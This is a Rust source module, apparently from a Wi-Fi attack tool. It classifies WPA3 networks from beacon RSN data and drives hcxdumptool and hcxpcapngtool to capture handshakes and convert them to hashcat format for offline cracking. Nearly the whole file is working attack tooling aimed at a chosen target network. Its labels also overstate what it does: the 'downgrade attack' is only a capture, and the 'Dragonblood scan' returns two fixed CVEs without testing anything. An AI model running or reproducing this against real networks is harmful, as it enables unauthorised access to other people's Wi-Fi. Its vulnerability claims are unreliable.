/*!
 * WPA3-SAE Attack Module
 *
 * Handles WPA3 detection, transition mode downgrade attacks,
 * SAE handshake capture, and Dragonblood vulnerability detection.
 */

use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

/// WPA3 network type classification
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Wpa3NetworkType {
    /// Pure WPA3 network (SAE only)
    Wpa3Only,
    /// WPA2/WPA3 mixed mode (transition mode - vulnerable to downgrade)
    Wpa3Transition,
    /// Protected Management Frames required
    PmfRequired,
    /// Protected Management Frames optional
    PmfOptional,
}

/// WPA3 attack type selection
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Wpa3AttackType {
    /// Force WPA3-Transition networks to WPA2 mode (80-90% success rate)
    TransitionDowngrade,
    /// Capture SAE handshake for offline cracking
    SaeHandshake,
    /// Scan for Dragonblood vulnerabilities
    DragonbloodScan,
}

/// WPA3 attack parameters
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Wpa3AttackParams {
    pub bssid: String,
    pub channel: u32,
    pub interface: String,
    pub attack_type: Wpa3AttackType,
    pub timeout: Duration,
    pub output_file: PathBuf,
}

/// WPA3 attack result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Wpa3Result {
    /// Handshake/PMKID captured successfully
    Captured {
        capture_file: PathBuf,
        hash_file: PathBuf,
    },
    /// No handshake captured
    NotFound,
    /// Attack stopped by user
    Stopped,
    /// Error occurred
    Error(String),
}

/// WPA3 attack progress updates
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Wpa3Progress {
    /// Attack started
    Started,
    /// Current step progress
    Step {
        current: u8,
        total: u8,
        description: String,
    },
    /// Handshake captured
    Captured {
        capture_file: PathBuf,
        hash_file: PathBuf,
    },
    /// No handshake found
    NotFound,
    /// Error occurred
    Error(String),
    /// Log message
    Log(String),
}

/// Dragonblood vulnerability information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DragonbloodVulnerability {
    pub cve: String,
    pub description: String,
    pub severity: String,
}

/// Check if hcxdumptool is installed and get version
pub fn check_hcxdumptool_installed() -> bool {
    Command::new("hcxdumptool")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

/// Get hcxdumptool version
pub fn get_hcxdumptool_version() -> Option<String> {
    let output = Command::new("hcxdumptool").arg("--version").output().ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}{}", stdout, stderr);

    // Parse version from output
    for line in combined.lines() {
        if line.contains("hcxdumptool") {
            return Some(line.trim().to_string());
        }
    }

    None
}

/// Check if hcxpcapngtool is installed
pub fn check_hcxpcapngtool_installed() -> bool {
    Command::new("hcxpcapngtool")
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok()
}

/// Get hcxpcapngtool version
pub fn get_hcxpcapngtool_version() -> Option<String> {
    let output = Command::new("hcxpcapngtool")
        .arg("--version")
        .output()
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}{}", stdout, stderr);

    for line in combined.lines() {
        if line.contains("hcxpcapngtool") {
            return Some(line.trim().to_string());
        }
    }

    None
}

/// Detect WPA3 network type from beacon frame
///
/// Parses RSN Information Element to determine WPA3 capabilities
pub fn detect_wpa3_type(rsn_ie: &[u8]) -> Option<Wpa3NetworkType> {
    // RSN IE structure:
    // - Element ID (1 byte): 0x30
    // - Length (1 byte)
    // - Version (2 bytes)
    // - Group Cipher Suite (4 bytes)
    // - Pairwise Cipher Suite Count (2 bytes)
    // - Pairwise Cipher Suites (4 bytes each)
    // - AKM Suite Count (2 bytes)
    // - AKM Suites (4 bytes each)
    // - RSN Capabilities (2 bytes)

    if rsn_ie.len() < 2 {
        return None;
    }

    // Skip element ID and length
    let mut offset = 2;

    // Check version (should be 1)
    if rsn_ie.len() < offset + 2 {
        return None;
    }
    offset += 2;

    // Skip group cipher suite
    if rsn_ie.len() < offset + 4 {
        return None;
    }
    offset += 4;

    // Get pairwise cipher suite count
    if rsn_ie.len() < offset + 2 {
        return None;
    }
    let pairwise_count = u16::from_le_bytes([rsn_ie[offset], rsn_ie[offset + 1]]) as usize;
    offset += 2;

    // Skip pairwise cipher suites
    if rsn_ie.len() < offset + (pairwise_count * 4) {
        return None;
    }
    offset += pairwise_count * 4;

    // Get AKM suite count
    if rsn_ie.len() < offset + 2 {
        return None;
    }
    let akm_count = u16::from_le_bytes([rsn_ie[offset], rsn_ie[offset + 1]]) as usize;
    offset += 2;

    // Parse AKM suites
    let mut has_sae = false;
    let mut has_psk = false;

    for _i in 0..akm_count {
        if rsn_ie.len() < offset + 4 {
            break;
        }

        let akm_suite = &rsn_ie[offset..offset + 4];
        offset += 4;

        // Check for SAE (WPA3)
        // OUI: 00-0F-AC, Type: 08 (SAE)
        if akm_suite == [0x00, 0x0F, 0xAC, 0x08] {
            has_sae = true;
        }

        // Check for PSK (WPA2)
        // OUI: 00-0F-AC, Type: 02 (PSK)
        if akm_suite == [0x00, 0x0F, 0xAC, 0x02] {
            has_psk = true;
        }
    }

    // Check RSN capabilities for PMF
    let pmf_required = if rsn_ie.len() >= offset + 2 {
        let capabilities = u16::from_le_bytes([rsn_ie[offset], rsn_ie[offset + 1]]);
        // Bit 7: Management Frame Protection Required
        // Bit 6: Management Frame Protection Capable
        let mfpr = (capabilities & 0x0080) != 0;
        let mfpc = (capabilities & 0x0040) != 0;

        if mfpr {
            Some(true)
        } else if mfpc {
            Some(false)
        } else {
            None
        }
    } else {
        None
    };

    // Determine network type
    match (has_sae, has_psk, pmf_required) {
        (true, true, _) => Some(Wpa3NetworkType::Wpa3Transition),
        (true, false, Some(true)) => Some(Wpa3NetworkType::Wpa3Only),
        (true, false, Some(false)) => Some(Wpa3NetworkType::PmfOptional),
        (true, false, None) => Some(Wpa3NetworkType::Wpa3Only),
        _ => None,
    }
}

/// Run WPA3 transition mode downgrade attack
///
/// Forces WPA3-Transition networks to use WPA2, then captures handshake
pub fn run_transition_downgrade_attack(
    params: &Wpa3AttackParams,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<Wpa3Progress>,
    stop_flag: &Arc<AtomicBool>,
) -> Wpa3Result {
    // Step 1: Verify tools
    let _ = progress_tx.send(Wpa3Progress::Step {
        current: 1,
        total: 6,
        description: "Verifying tools installation".to_string(),
    });

    if !check_hcxdumptool_installed() {
        let _ = progress_tx.send(Wpa3Progress::Error(
            "hcxdumptool not found. Install with: brew install hcxdumptool".to_string(),
        ));
        return Wpa3Result::Error("hcxdumptool not installed".to_string());
    }

    if !check_hcxpcapngtool_installed() {
        let _ = progress_tx.send(Wpa3Progress::Error(
            "hcxpcapngtool not found. Install with: brew install hcxtools".to_string(),
        ));
        return Wpa3Result::Error("hcxpcapngtool not installed".to_string());
    }

    let _ = progress_tx.send(Wpa3Progress::Log("✓ Tools verified".to_string()));

    // Step 2: Start capture with hcxdumptool
    let _ = progress_tx.send(Wpa3Progress::Step {
        current: 2,
        total: 6,
        description: "Starting WPA3 capture".to_string(),
    });

    let capture_file = params.output_file.clone();

    let mut args = vec![
        "-i",
        &params.interface,
        "-o",
        capture_file.to_str().unwrap(),
        "--enable_status=1",
    ];

    // Filter by BSSID if provided
    if !params.bssid.is_empty() {
        args.push("--filterlist_ap");
        args.push(&params.bssid);
    }

    let _ = progress_tx.send(Wpa3Progress::Log(format!(
        "Launching hcxdumptool on channel {}",
        params.channel
    )));

    let mut child = match Command::new("hcxdumptool")
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => child,
        Err(e) => {
            let _ = progress_tx.send(Wpa3Progress::Error(format!(
                "Failed to start hcxdumptool: {}",
                e
            )));
            return Wpa3Result::Error(format!("Failed to start hcxdumptool: {}", e));
        }
    };

    let _ = progress_tx.send(Wpa3Progress::Log("✓ Capture started".to_string()));

    // Step 3: Monitor capture
    let _ = progress_tx.send(Wpa3Progress::Step {
        current: 3,
        total: 6,
        description: "Capturing handshakes".to_string(),
    });

    let timeout = params.timeout;
    let start = std::time::Instant::now();

    // Poll until timeout or stop
    while start.elapsed() < timeout && !stop_flag.load(Ordering::Relaxed) {
        std::thread::sleep(Duration::from_secs(1));

        // Check if still running
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    let _ = progress_tx.send(Wpa3Progress::Error(
                        "hcxdumptool exited unexpectedly".to_string(),
                    ));
                    return Wpa3Result::Error("hcxdumptool failed".to_string());
                }
                break;
            }
            Ok(None) => {
                // Still running
            }
            Err(e) => {
                let _ = progress_tx.send(Wpa3Progress::Error(format!(
                    "Error checking hcxdumptool: {}",
                    e
                )));
                return Wpa3Result::Error(format!("Error monitoring capture: {}", e));
            }
        }
    }

    // Stop capture
    if stop_flag.load(Ordering::Relaxed) {
        let _ = child.kill();
        let _ = progress_tx.send(Wpa3Progress::Log("Capture stopped by user".to_string()));
        return Wpa3Result::Stopped;
    }

    let _ = child.kill();
    let _ = progress_tx.send(Wpa3Progress::Log("✓ Capture completed".to_string()));

    // Step 4: Convert to hashcat format
    let _ = progress_tx.send(Wpa3Progress::Step {
        current: 4,
        total: 6,
        description: "Converting to hashcat format".to_string(),
    });

    let hash_file = capture_file.with_extension("22000");
    let hash_file_str = hash_file.to_str().unwrap().to_string();

    let output = match Command::new("hcxpcapngtool")
        .args(&["-o", &hash_file_str, capture_file.to_str().unwrap()])
        .output()
    {
        Ok(output) => output,
        Err(e) => {
            let _ = progress_tx.send(Wpa3Progress::Error(format!(
                "Failed to convert capture: {}",
                e
            )));
            return Wpa3Result::Error(format!("Conversion failed: {}", e));
        }
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Check if conversion successful
    if !output.status.success() {
        let _ = progress_tx.send(Wpa3Progress::Error(format!(
            "Conversion failed: {}{}",
            stdout, stderr
        )));
        return Wpa3Result::Error("Failed to convert capture".to_string());
    }

    // Check if hash file created and non-empty
    if !hash_file.exists() {
        let _ = progress_tx.send(Wpa3Progress::Error(
            "No handshakes found in capture".to_string(),
        ));
        return Wpa3Result::NotFound;
    }

    let file_size = match std::fs::metadata(&hash_file) {
        Ok(metadata) => metadata.len(),
        Err(_) => 0,
    };

    if file_size == 0 {
        let _ = progress_tx.send(Wpa3Progress::Error(
            "No valid handshakes captured".to_string(),
        ));
        return Wpa3Result::NotFound;
    }

    let _ = progress_tx.send(Wpa3Progress::Log(format!(
        "✓ Converted to hashcat format ({} bytes)",
        file_size
    )));

    // Step 5: Success
    let _ = progress_tx.send(Wpa3Progress::Step {
        current: 6,
        total: 6,
        description: "Capture complete".to_string(),
    });

    let _ = progress_tx.send(Wpa3Progress::Captured {
        capture_file: capture_file.clone(),
        hash_file: hash_file.clone(),
    });

    Wpa3Result::Captured {
        capture_file,
        hash_file,
    }
}

/// Run SAE handshake capture
///
/// Captures SAE handshake for WPA3-only networks
pub fn run_sae_capture(
    params: &Wpa3AttackParams,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<Wpa3Progress>,
    stop_flag: &Arc<AtomicBool>,
) -> Wpa3Result {
    // SAE capture is the same as transition downgrade
    // hcxdumptool handles both WPA2 and WPA3-SAE
    run_transition_downgrade_attack(params, progress_tx, stop_flag)
}

/// Check for Dragonblood vulnerabilities
///
/// Detects known WPA3 vulnerabilities in the target network
pub fn check_dragonblood_vulnerabilities(
    _network_type: Wpa3NetworkType,
) -> Vec<DragonbloodVulnerability> {
    let mut vulnerabilities = Vec::new();

    // CVE-2019-13377: SAE timing attack
    vulnerabilities.push(DragonbloodVulnerability {
        cve: "CVE-2019-13377".to_string(),
        description: "SAE handshake timing side-channel allows password partitioning attack"
            .to_string(),
        severity: "Medium".to_string(),
    });

    // CVE-2019-13456: Cache-based side channel
    vulnerabilities.push(DragonbloodVulnerability {
        cve: "CVE-2019-13456".to_string(),
        description: "Cache-based side-channel attack on SAE password element derivation"
            .to_string(),
        severity: "Medium".to_string(),
    });

    vulnerabilities
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wpa3_detection_transition_mode() {
        // RSN IE with both SAE and PSK
        let rsn_ie = vec![
            0x30, 0x1C, // Element ID + Length
            0x01, 0x00, // Version
            0x00, 0x0F, 0xAC, 0x04, // Group cipher (CCMP)
            0x01, 0x00, // Pairwise count
            0x00, 0x0F, 0xAC, 0x04, // Pairwise cipher (CCMP)
            0x02, 0x00, // AKM count
            0x00, 0x0F, 0xAC, 0x02, // PSK
            0x00, 0x0F, 0xAC, 0x08, // SAE
            0xC0, 0x00, // Capabilities (MFPC + MFPR)
        ];

        let result = detect_wpa3_type(&rsn_ie);
        assert_eq!(result, Some(Wpa3NetworkType::Wpa3Transition));
    }

    #[test]
    fn test_wpa3_detection_sae_only() {
        // RSN IE with only SAE
        let rsn_ie = vec![
            0x30, 0x18, // Element ID + Length
            0x01, 0x00, // Version
            0x00, 0x0F, 0xAC, 0x04, // Group cipher
            0x01, 0x00, // Pairwise count
            0x00, 0x0F, 0xAC, 0x04, // Pairwise cipher
            0x01, 0x00, // AKM count
            0x00, 0x0F, 0xAC, 0x08, // SAE only
            0xC0, 0x00, // Capabilities (MFPC + MFPR)
        ];

        let result = detect_wpa3_type(&rsn_ie);
        assert_eq!(result, Some(Wpa3NetworkType::Wpa3Only));
    }

    #[test]
    fn test_check_tools_installed() {
        // Just verify functions don't panic
        let _ = check_hcxdumptool_installed();
        let _ = check_hcxpcapngtool_installed();
        let _ = get_hcxdumptool_version();
        let _ = get_hcxpcapngtool_version();
    }

    #[test]
    fn test_dragonblood_detection() {
        let vulns = check_dragonblood_vulnerabilities(Wpa3NetworkType::Wpa3Only);
        assert!(!vulns.is_empty());
        assert!(vulns.iter().any(|v| v.cve == "CVE-2019-13377"));
        assert!(vulns.iter().any(|v| v.cve == "CVE-2019-13456"));
    }
}
